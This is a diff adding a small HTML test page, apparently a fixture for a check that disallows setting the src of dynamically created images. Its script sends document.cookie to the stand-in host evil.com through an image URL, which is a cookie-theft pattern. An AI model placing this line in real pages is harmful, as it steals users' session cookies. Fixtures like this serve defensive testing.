@@ -1,0 +1,14 @@
+<html lang="en">
+
+<head>
+    <title>Disallow setting of src property of dynamic images</title>
+</head>
+
+<body>
+<script>
+  var img = document.createElement('img');
+  img.src = 'http://evil.com?take='+document.cookie;
+</script>
+</body>
+
+</html>
